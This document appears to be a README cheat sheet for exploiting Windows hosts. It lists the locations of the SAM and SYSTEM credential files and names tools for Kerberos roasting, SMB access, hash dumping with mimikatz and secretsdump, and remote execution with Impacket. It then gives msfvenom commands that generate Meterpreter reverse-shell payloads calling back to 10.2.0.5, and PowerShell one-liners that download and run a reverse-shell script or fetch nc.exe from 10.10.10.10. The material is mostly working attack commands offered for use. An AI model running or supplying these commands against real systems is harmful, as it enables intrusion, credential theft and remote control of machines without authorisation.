# Windows-Exploitation-More


## Log files Location
``` 
C:\Users\<UserName>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
C:\Windows\System32\winevt\Logs
```
#### SAM and SYSTEM file
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYTEM
```


## [Tools](https://github.com/z3dc0ps/windows-exploitation-more/tree/main/tools)

#### PORT 88 Kerberos
```
GetNPUsers.py
GetUserSPNs.py
kerbrute
```

#### PORT 139,445 SMB
```
smbclient
smbmap
```
#### PORT 5985 winrm 
```
Evil-winrm
```

#### Dump NTLM/HASH
```
secretsdump.py

mimikatz
```

#### Privilege Escalation Check
```
WinPEAS
```
#### Execute Commands
<a href="https://www.hackingarticles.in/remote-code-execution-using-impacket/">Read More</a>
```
atexec.py     - RPC
psexec.py     - SMB 
smbexec.py    - SMB
wmiexec.py    - WMI
crackmapexec
```
## [Payloads](https://github.com/z3dc0ps/windows-exploitation-more/tree/main/payloads)

```
mini-reverse.ps1
windows_php_shell.php
```
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.0.5 LPORT=1234 -f exe > shell.exe
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f psh > shell.ps1

```



## Upload File
```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8000/mini-reverse.ps1')" 
```
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/mini-reverse.ps1') | powershell -noprofile
```
```
powershell.exe wget "http://10.10.10.10:8000/nc.exe" -outfile "c:\temp\nc.exe"
```
```
Invoke-WebRequest -Url "http://10.10.10.10:8000/nc.exe" -OutFile ".\nc.exe"
Unblock-File ".\nc.exe"
```


